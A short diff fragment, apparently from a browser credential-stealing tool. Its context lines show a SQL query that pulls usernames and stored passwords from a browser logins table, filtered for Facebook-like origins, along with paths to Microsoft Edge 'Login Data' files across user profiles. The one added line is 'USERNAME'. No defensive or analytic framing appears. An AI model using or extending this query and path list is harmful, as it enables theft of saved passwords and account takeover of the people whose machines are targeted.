@@ -32,3 +32,4 @@ select username_value, password_value from logins where origin_url like '%facebo
 \\..\\Local\\Microsoft\\Edge\\User Data\\Default\\Login Data
 \\..\\Local\\Microsoft\\Edge\\User Data\\Profile 
 \\Login Data
+USERNAME
